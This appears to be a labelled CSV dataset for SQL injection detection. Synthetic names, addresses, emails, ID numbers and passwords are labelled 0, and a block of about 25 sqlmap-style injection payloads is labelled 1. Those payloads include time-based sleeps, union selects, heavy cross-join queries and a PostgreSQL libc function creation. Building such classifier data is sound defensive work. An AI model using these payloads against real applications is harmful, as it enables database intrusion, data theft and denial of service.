Query,Label
lei-see,0
ineluctable,0
rahue,0
serna kovac,0
pozzetto@miplat.am,0
51795949h,0
"calle del derecho 17,",0
cervera de la caada,0
50693,0
9473535060757439,0
havis,0
7a2a6t1ro,0
1858,0
cooksey,0
pavorde,0
elois,0
gomero gallardo,0
terrio@likeanangel.dz,0
46773841y,0
"paratge ter, 33,",0
arndiga,0
8554607392278464,0
vial,0
muntaner nevado,0
vasilescu.lisi@drogasvirtuales.sc,0
37905890g,0
"luis braille, 33, 12?d",0
matar,0
40529,0
4608056297024601,0
werling,0
encalador,0
7012,0
barnhill,0
ten.tar,0
quintilio,0
naharro,0
vitola@23horas.ad,0
38980059g,0
"calle isis, 180",0
45810,0
6172398321911966,0
janeva,0
desconsolar,0
lzaro,0
hinwood-laretei@addl.es,0
infante juan manuel s/n 5?a,0
canfranc,0
26323,0
9738066615220073,0
radioelctrica,0
3679,0
blondell3,0
apotrerar,0
mochn quer,0
peller@arvigar.gs,0
30503437d,0
"carrer asturies, 49",0
49135,0
8582534834926521,0
aghili,0
escultrico,0
colunga corrius,0
bukoontot@google-movil.cm,0
69634179t,0
c/ asuncion 115 5e,0
almonacid de la sierra,0
6689689469452036,0
rorke,0
3u23pe,0
3318,0
philippa,0
carroar,0
salgado pladellorens,0
schwab.carli@emepleo.info,0
"calle batalla de muhlberg, 25, 6?a",0
villadoz,0
27860,0
brenda,0
8ienne2s6,0
alpar-ornstein@rockefeller.nu,0
15423399j,0
horcajo de montemayor,0
46844,0
gourley,0
sensualmente,0
consalve,0
c406l2n5,0
fabrizio,0
kunneke@storagecraft.nz,0
89740217j,0
"c/ gravina, s/n",0
igzquiza,0
17867,0
6453670410602968,0
zandra,0
agenor,0
iraola rudi,0
chamberlain@muevemiweb.al,0
calle jaime ferranz 51,0
castellanos de zapardiel,0
12163,0
"1' where 6406=6406;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1
"1) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (4666=4666",1
-3136%') or 3400=6002,1
1) where 7956=7956 or sleep(5)#,1
-7387'))) order by 1--,1
1')) as gfzb where 7904=7904;begin dbms_lock.sleep(5); end--,1
"1))) union all select null,null,null#",1
"-5622"" where 7970=7970 union all select 7970,7970,7970,7970,7970--",1
"1"")) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""smnw"" like ""smnw",1
"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",1
"1));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((7240=7240",1
-2604)) as sekb where 6897=6897 or 1000=7683,1
"1%""))) waitfor delay '0:0:5'--",1
"1"") as nraw where 7984=7984 and elt(3114=3114,sleep(5))#",1
1');begin dbms_lock.sleep(5); end and ('jzlr'='jzlr,1
"1%"");select benchmark(5000000,md5(0x714e4153))#",1
"1'))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
"1%"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (((""%""=""",1
"-4259')) as usqu where 5419=5419 or elt(8325=8837,8837)--",1
"1')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('ijyi'='ijyi",1
-1638' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'xkne'='xkne,1
"-2583"") where 3455=3455 or make_set(9354=9354,7185)--",1
"-6267""))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""rqws""=""rqws",1
"1%"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
"1%'))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
8496429893525706,0
tweddle,0
t324a3ra5a,0
4932,0
sirevici,0
di0cut6dor7,0
jener monaj,0
90230020p,0
los polancos 133,0
"pintanos, los",0
6034871098442134,0
berrisfo,0
zaguero,0
vingelli9@custombikesclothes.fr,0
39202408n,0
"c/ montaer ruiz, 24, 12a",0
fuentelmonge,0
3609841962548925,0
isador,0
m*ule38,0
4906,0
marcanti,0
cimorra,0
jezabel,0
pawluszek segu,0
knippenberg@soyriojano.cf,0
05782219l,0
"c/ ricardo codoer, 112,",0
iza,0
brunhild,0
te3496,0
martinn sampayo,0
allaert@chicasdiabolo.ru,0
63974696n,0
"calle plantio, 178,",0
fla,0
50629,0
benning,0
demostrar,0
6212,0
sask,0
refriega,0
isidoro,0
rudie@deuxmanagement.jo,0
06918701w,0
"calle la caldera, 76 11-c",0
guilas,0
4898771590601702,0
lap,0
ramblizo,0
42287106l,0
"calle beato tomas de zumarraga, 89 12-c",0
8043015940180984,0
olsen,0
5urgui8a,0
6087,0
spindler1,0
trincha-32r1,0
stoeckel@hacia.sa,0
08363269d,0
"alqueria de pixarroda, 27",0
tossa de mar,0
0277189059505279,0
dotan,0
rescisorio,0
terribas,0
leftwich@sms24h.sb,0
valdemaluque,0
12232,0
5580428033394873,0
masahiro,0
comba,0
1140,0
humfrey,0
e23i6gulo,0
nicolo,0
brines grimalda,0
floor@aebo.af,0
88341714w,0
"calle hernan cortes, 58,",0
29639,0
0052422482512057,0
38i2t702,0
nanni-prucnal@fighting-machines.gf,0
08447437c,0
"c/ reina del cielo 136, 8-d",0
46510,0
0878247632477262,0
09ca93a4i9lar,0
973,0
merl,0
70p89c9cion958,0
quintn,0
bricat,0
drozdek.waechter@tarifasdevuelos.bj,0
03046730n,0
"ronda sant antoni maria claret 144,",0
villacastn,0
jawad,0
92frico,0
hans,0
pipiolo sandrini,0
velero@softwaresaas.ec,0
30666350j,0
"c/ barriada nueva andalucia, 79, 5?f",0
lora,0
12965,0
anja,0
3803,0
vivie4,0
descarada,0
lian,0
colosse@velaconsultores.gob,0
85640413m,0
"c/ san juan bautista 66, 1?f",0
fuente de pedro naharro,0
24410,0
1710045357867718,0
inusitado,0
de la barca pitti,0
dierking3@carmensanmartin.kn,0
69557398q,0
"diaz camacho 107, 2-a",0
9636562879352994,0
beilul,0
trashumacin,0
389,0
hadel,0
hatajo,0
yasna,0
brivio,0
hymen_israeli@aulahost.vc,0
"cami llorito, 38",0
ansa-sobrarbe,0
5968115219030593,0
bordin,0
rebalg1r,0
jeria cifr,0
litchterman.steiner6@myalbum.by,0
88426780z,0
"calle costa de llevant, 52",0
murillo el cuende,0
34111,0
ligurs,0
retos9a1o,0
2268,0
braham,0
wieth@camiones-hibridos.md,0
47355557y,0
"cami can rabella, s/n",0
"manzano, el",0
5393761266970595,0
virchick1,0
superable,0
leonila,0
duran manero,0
paris-loisel@viavilano.cr,0
49511678s,0
"burgos, s/n, 1f",0
boimorto,0
08191,0
1959107690181502,0
cycelia,0
rosoli,0
1166,0
swope,0
tr?abal,0
gutman@latiendadecolchones.mn,0
86626999y,0
plaza tilos s/n,0
cubillas de santa marta,0
10182,0
7578225963562090,0
raha,0
de5pi6ar4za4,0
helano,0
sagu cnstenla,0
santaniello_tabernero@enfuerteventura.com.ni,0
20847295a,0
plaza asociacion de la prensa 107,0
segura de los baos,0
14140,0
reid5,0
chimenea,0
544,0
jailyn,0
irado,0
arn cantisn,0
norring-fujikawa@autoconstruccion.au,0
"plza. salamanca 39,",0
langa del castillo,0
50780,0
2787973107257855,0
jaswal,0
d060u2ar,0
hania,0
limongi diguez,0
hesseman.dolen@gaudio.mu,0
calle vallseca 123,0
pleitas,0
5176682769033876,0
guillory,0
arme!lluela,0
5155,0
mcculloc,0
menju,0
iris,0
duo_davalos@designworld.cz,0
23251820q,0
isla de cuba 85 3-b,0
coripe,0
06927,0
zauhar,0
semanera,0
ezequiel,0
langellotti,0
schaafsma@gay-tantra.sj,0
"calle alfaz del pi, 96 11?d",0
villanueva del rebollar,0
38450,0
8198356178876064,0
grimsley,0
luego,0
3880,0
trampeador,0
kovac,0
97230292t,0
"calle de can castellvi 35, 10-h",0
vindel,0
28194,0
humfrid,0
expendedora,0
leonelo,0
carvajal,0
lightner.manor@rosaserigrafia.as,0
83217349z,0
castellnovo,0
19127,0
3413347210986966,0
ania,0
esmilcea,0
3040,0
huerfanidad,0
robertino,0
hindman@primeracasa-ebs.il,0
91220241x,0
"jose gomez gallito, 107,",0
alarba,0
32252,0
0577312599845778,0
cowart,0
inoportunamente,0
cibeles,0
garrudo castellon,0
carminati@granbretana.com.uk,0
33273113w,0
"calle pea 49, 9?b",0
munbrega,0
4611888318080805,0
merriell,0
adapuesto,0
3151,0
alvean,0
9o52cardea7,0
benito@mayoriasilenciosa.mu,0
16574331w,0
calle juan de sevilla 102 3c,0
cabanabona,0
33001,0
kouhi,0
4az,0
roehn.kernke@eldeseodepecar.ec,0
78267819s,0
"calle rendona 45, 5-a",0
8914644367191799,0
fady,0
a8o8decer,0
2049,0
sonoe,0
idalio,0
hirn,0
portal tauler,0
edlund@cementoscalibra.yu,0
"c/ mirra 25,",0
sant quirze de besora,0
27784,0
8648898617825850,0
meier,0
c6nte9osa,0
nimia,0
buisn andres,0
oliveira_aptekman@engibraltar.va,0
"inocencia alayon, s/n 4-f",0
san bartolom de la torre,0
12510,0
3227728964471059,0
nadav6,0
pent0et3o,0
3244,0
keer,0
gala,0
amarili,0
waggenheim@rubirubi.info,0
55265136t,0
"c/ general merry del val, s/n",0
45674,0
2996877022240469,0
wa77en,0
"torrent de can caralleu 48, 12-g",0
telde,0
50513,0
7745667684469889,0
brain,0
c7ada98o,0
7242,0
kalpak,0
tolera9lemen8e,0
sixto,0
peredo huecas,0
byron@vinavilano.gl,0
21468433a,0
"toril, 171 5h",0
45790,0
5036144025003599,0
edlene,0
descote,0
albiol,0
blankenship@likeanangel.tc,0
14554532v,0
"calle jose espejo, 130, 12?a",0
42148,0
muth,0
tom159,0
3046,0
neufeld,0
ru5runears2,0
leobaldo,0
benson-rabasa@mareventsprotocolosocial.ad,0
53087910t,0
"zafiro, s/n 4?b",0
urdiales del pramo,0
50174,0
wei-tsig8,0
oti sineiro,0
sabu@aridossanchez.lt,0
"avinguda pinyana, 7 2-h",0
avellanosa de mu,0
06196,0
4780723426433072,0
teddie,0
abellot*ada,0
new,0
583opi4,0
donaldo,0
castell sargatal,0
radir@diagnosticoradiologico.mil,0
58222899d,0
"camino hoya mondongo, 124",0
galende,0
01267,0
3892784649587009,0
vacher,0
coxcojita,0
quiliano,0
77232447b,0
pombal 114 3?d,0
puerto de bjar,0
5399041434530750,0
ramesh,0
cane5o,0
8516,0
haroun,0
lluv8os4,0
einar,0
vano branchadell,0
02650843r,0
"c/ la hoz, 17",0
pia de campos,0
3556606130011191,0
sandie,0
en8relan3amien0o,0
osteicoechea uslet,0
pavlow@permutatucasa.fm,0
60537126e,0
"luis de gongora, 189",0
9438831900620350,0
mariana,0
emblanquimiento,0
1789,0
sari7,0
4m4or6711a662,0
corico,0
sebastian_ferdi@tintaultravioleta.mv,0
95549133a,0
"sayago, 156,",0
baos de molgas,0
28760,0
hocutt,0
monte9a,0
sibila,0
garcez iturriria,0
neugebauer@buscamoto.gw,0
37246742j,0
"galeno 106, 9?c",0
ciadoncha,0
17744,0
8444341614355746,0
tiefenth,0
i77ovar,0
8436,0
rini,0
inobediecia,0
donaciano,0
matienzo gallifa,0
69082096d,0
c/ guillen santacilla 94,0
estepa,0
40151,0
harmonie,0
6r5int3805,0
parmenia,0
ikediek torrades,0
tarp@redstarz.asia,0
don juan 126,0
"oso, el",0
17403,0
3786004753545909,0
3andador4,0
1112,0
brion6,0
demos3rativa,0
gavald,0
selk@inversioneolica.ee,0
45854746z,0
"c/ cal correu, 0,",0
cbdar,0
08030,0
cal,0
acrianzada,0
mairozio,0
victor juan,0
ballasko@quehaces.mr,0
78258633y,0
"calle sierra del quintanar, 199 9-b",0
gaianes,0
2930629510541352,0
ex074ico,0
1230,0
iorgo,0
c0l0o4a,0
bentez monill,0
mouchet@007tv.fj,0
50159319e,0
"antonio toledano, 78, 10?h",0
roelos de sayago,0
49167,0
uriah,0
cabildeo,0
maestre camprubi,0
eckstine@blueeyes.eu,0
46942381w,0
"guadalajara, 101 4-e",0
venialbo,0
17861,0
6913071576619939,0
beland,0
gravoso,0
7192,0
ryszard,0
e1bud8,0
alarico,0
nrez muriscot,0
gude1@messadivoce.ai,0
"logroo, 98, 5-d",0
sant lloren savall,0
09228,0
9589985001483437,0
harty,0
torns,0
llobet,0
brace4@velazquezlarraaga.kz,0
19783837l,0
"alcalde lopez rancao, 194, 3-e",0
vilafams,0
09270,0
1499600534131254,0
mundy,0
alatn,0
5642,0
chan+quete,0
jernima,0
zuiga urbina,0
grandinetti@mariposasentudia.mm,0
69653229y,0
"cruz de caravaca, 177",0
daimiel,0
14970,0
4159457629727955,0
valcourt,0
encuar,0
dels,0
brau ganfornina,0
angele6@juegossonic.com.eh,0
64721683m,0
c/ francisco grande cobian 90 4-e,0
uju,0
41570,0
5068023807822442,0
loudiadi,0
in85ecuacin,0
1304,0
athony,0
irresolucin,0
nemesio,0
bedmar,0
veronese@prestigecars.tv,0
99020664y,0
"calle doctor jose manuel pascual y pascual 146, 4?c",0
torrecilla del monte,0
29620,0
0936495801431480,0
or5i6or6i686,0
llull valls,0
ordezanka@arroyo-molinos.dj,0
calle oxigeno 197,0
costur,0
49495,0
7482251600785207,0
witney,0
malandrn,0
546,0
kipnis,0
fantaseadora,0
aitor,0
scanlon@theroxyblue.ng,0
28045405x,0
alcalde gregorio espino 165,0
pozanco,0
18212,0
3596949565075836,0
dud,0
rayadillo,0
henriquez femenias,0
seymour@evelin.gn,0
81587737k,0
"c/ fray diego de cadiz, 50",0
mombuey,0
3302117123489448,0
kiyohara,0
47761an0i59r,0
576,0
downs,0
tapinga,0
jemima,0
sunyer lleix,0
abadia@comercioenlacalle.er,0
87348482w,0
"c/ carranque, 113 5?a",0
45240,0
8490972534756597,0
kobeski,0
prueba,0
vivencio,0
goyenaga,0
lenya@fbi-criminal-network.com.mil,0
hermanos barral 61,0
cantaracillo,0
40190,0
5076820691273276,0
sosa,0
fraccionario,0
9253,0
trung,0
fragmentar,0
quiyen,0
ricci@redhost.is,0
89821319v,0
pl. herrera de los navarros 68 12-h,0
palacios del arzobispo,0
8322438262219801,0
chung,0
reele.cto,0
roussel@santacruzdelvoto.ws,0
96269598q,0
calle bernat de santa eugenia 90,0
sariego,0
7626699319590675,0
onofredo,0
domeable,0
2864,0
babar4,0
cornisamen!to,0
miller_fiore9@olvidalo.sy,0
17652259n,0
calle segismundo moret 93 1?a,0
50297,0
0614375180233873,0
racette,0
j804n86o,0
puy,0
borgeaud@enmenorca.com.om,0
52984297w,0
"jabeque, 86,",0
relleu,0
tetreaul7,0
espavorida,0
9564,0
23l8noi7e,0
bez clua,0
gretler-rinell@magadan.com.yu,0
38888523p,0
lugar grela 152 1?f,0
19185,0
bui,0
soportador,0
trilles aedo,0
arena@productosgarantizados.uy,0
79365532f,0
calle siete cerros 144,0
hornillos del camino,0
pankiw,0
f8rol5ra,0
8671,0
9a7bl1,0
paucides,0
yeti llamus,0
selj@ebaz.travel,0
plza. maimonides 197,0
bscones de ojeda,0
15873,0
1204533777404121,0
faucette,0
grandlocua,0
talavera panfili,0
thyssen.ferrell@somosagelespaa.bg,0
79140741h,0
tierra 17,0
sant joan de vilatorrada,0
34305,0
9307824408281680,0
pipponzi,0
5469,0
clarabel,0
enconadura,0
redmond-delcampe@biosaludsystems.do,0
calle corinto 108,0
47606,0
ordinar,0
edel,0
vogin,0
costello_browallius@autoconstruccion.bt,0
07375030b,0
"c/ bascuana 52, 5-e",0
puebla de obando,0
parman,0
c4ap0765do,0
108,0
ja3aln,0
neri,0
crisp vivo,0
chopel@restauranteslaespadaa.bg,0
"san jorge, 188",0
ysero,0
10380,0
9771406974624162,0
lukers,0
ofere*nte,0
gastn,0
faix,0
bartowna@professionalhost.do,0
69441548v,0
"calle gola de perellonet, 196,",0
albuixech,0
5220241028812840,0
ch9let_a,0
1084,0
denni,0
e3c7i3tu3a,0
alceo,0
torremoroso enrich,0
amsterdam@mailboxrussia.nz,0
33371147x,0
"c/ torre, 151, 9?b",0
50004,0
6187378791844475,0
dowser,0
comiso,0
barker ropero,0
thordsen@guejos.sy,0
02877417w,0
calle villalon 13 1g,0
46842,0
0911357592887177,0
oucharek,0
?malgastador,0
6721,0
marcum3,0
26t9g71,0
leda,0
pifarre marola,0
foody@cup-id.sd,0
57401003h,0
"juan xxii 24, 3?c",0
aldehuela de yeltes,0
46838,0
7496121103658289,0
babs,0
9mbaicin,0
jovn,0
cladera,0
seddon@7peines.es,0
68035116n,0
"calle los tipografos, 98, 4g",0
tors,0
6239536280691962,0
funderbu,0
a9tr8pfag4,0
6501,0
patenaud,0
9a470ul0,0
gaudencio,0
barreras de la bandera,0
clunes7@palodegolf.com.coop,0
25559456q,0
"calle joaquin gamon 175, 2-c",0
villamuriel de cerrato,0
5212720427288459,0
coder,0
4s2cu8e44,0
"parque san adrian, 196, 5h",0
tredway,0
torrija,0
4337,0
scherzin,0
perih1lio,0
gervasio,0
princep muntadas,0
young-kyun@forohh.cl,0
"jose muoz san roman, s/n,",0
9475732136741046,0
xavier,0
tarasca,0
10262643c,0
c/ javea 57,0
22470,0
1055239425022881,0
chabert,0
chinchintor,0
8232,0
co01,0
gierasch.casini@goovitae.cu,0
"passeig bosc, 157",0
13107,0
8230522127552712,0
eugenia,0
silcula,0
juan de dios,0
bestard,0
oleilnikov_balasko@hostprofessional.ac,0
84996241v,0
padre maltes 26 5a,0
villarejo-periesteban,0
47172,0
0183912378069519,0
414rd7f132o,0
3614,0
stroupe,0
e561o,0
culler castanyer,0
flloko-humet@imarbella.ms,0
54925627v,0
"c/ obispo alonso suarez, 163,",0
cervatos de la cueza,0
34347,0
6552399616832844,0
mathur,0
indis6r4cin,0
damacia,0
rost jorge,0
signoret@pisossantcugat.cat,0
78153384m,0
"pedrosa d 15, 7?a",0
"carpio de tajo, el",0
49280,0
griffy,0
mgi4a,0
7896,0
antonino,0
2isopada,0
berroteran,0
boom@paseotuperro.mo,0
87258503e,0
"carrera 55,",0
santiago de la puebla,0
16311,0
9269450355652252,0
mong-tse,0
dra2atizar,0
algu chavarri,0
16296629w,0
"calle miguel lopez de legazpi, 48, 8f",0
50692,0
5939892220484174,0
kipp,0
rob,0
3497,0
juneho,0
retasac5n,0
erwin,0
torreblanca pujades,0
bellew@frioelectric.no,0
92251391r,0
madrazo 115,0
sotalbo,0
5264009665543297,0
ayyuce,0
broun_granlund@purplemoongrn.fi,0
48872890y,0
tauro 34 7b,0
iznatoraf,0
50374,0
0058041048086449,0
lor81a5o,0
6629,0
ricard,0
61z,0
quilino,0
rigau amer,0
pogam@soycatalan.aq,0
"c/ cerro, 87 2?b",0
orbita,0
6470509098489788,0
ohmaru,0
re681g48rdia,0
astor,0
pia rusch,0
glazar@x2.com.net,0
62746544z,0
"calle capitan godoy beltran, 120",0
guadalcanal,0
neils,0
m974or5s2,0
servitje areggiani,0
rocheman@sindns.er,0
53527134q,0
"caada de los ingleses, 117,",0
cantoria,0
20110,0
1059842916427607,0
fullum6,0
pacfica,0
crast_litel@cortell.al,0
68689912k,0
"conde de olocau, s/n, 3g",0
oliva,0
45939,0
9783618046984809,0
trixie,0
falerno,0
6766,0
2a6in6rosa,0
poca urzagaste,0
slavova@costablancarental.ug,0
"infantes de carrion, 122",0
0858629096397391,0
teodora,0
c944i6a,0
rosset,0
swedlow@ubikuo.ga,0
"calle teresa pamies i bertran 21,",0
santa maria de corc,0
16340,0
papageno,0
511amasa,0
8451,0
daren9,0
acimentarse,0
tucker.faulkner@clichotel.ck,0
90660924f,0
av. carlos marx s/n,0
02327,0
7309058964317313,0
lyle,0
equiparar,0
el khouri hausdorf,0
darrieu@redstarz.sv,0
54057566e,0
"calle robregordo, 171 10-c",0
andratx,0
23711,0
4296025977282656,0
revill5,0
acomplexionada,0
rigby,0
pascuet landivar,0
moskuna@sitcpla.ye,0
45053569l,0
"duende, 138,",0
"guingueta d'neu, la",0
40170,0
491vi06a5,0
cardenas_johansson@sorority.kz,0
35817134q,0
19432,0
4436070714409479,0
reggis,0
p5nderativa,0
7576,0
rurick5,0
par4u8i67t3,0
branchadell arribas,0
66702102d,0
"comandante barja 84,",0
24443,0
0227003559920538,0
tewksbur,0
.raijo,0
rhys,0
rigand@suncorp.mk,0
66129193f,0
"c/ pontevedra 25, 6a",0
ferreruela,0
09246,0
0720546534771199,0
coursdev,0
filicidio,0
5966,0
dorene6,0
2e0814r1pada,0
beiza ivanco,0
butts@maxtienda.na,0
93026638x,0
"pesquera, la",0
24152,0
9695488884758445,0
akio,0
peng1in,0
berenice,0
segu san marful,0
knight_freihart@tresbrujas.qa,0
01246496b,0
"azorin, 167",0
cuevas labradas,0
tawnya3,0
semicopado,0
8903,0
jubinvil,0
m0nuta9,0
domingo,0
larsson.dorio@ankawaelda.it,0
"plaa gabriela mistral, 140",0
aldehuela del codonal,0
6020931193339547,0
mcduffie,0
manganear,0
wayca,0
dabbas hurtado,0
76518142v,0
"sierra bermeja s/n,",0
ajamil,0
0567191601469528,0
vilmanse80,0
opopnaco,0
4599,0
nugent,0
cangrenarse,0
pablo de la cruz,0
de jongh algarra,0
jorey@20horas.ao,0
37200229y,0
"carrer marcos redondo, 132, 8?f",0
piqueras,0
5359941637472612,0
franklyn,0
sanidad,0
dalia,0
patorzinski@filtraciondehumos.hr,0
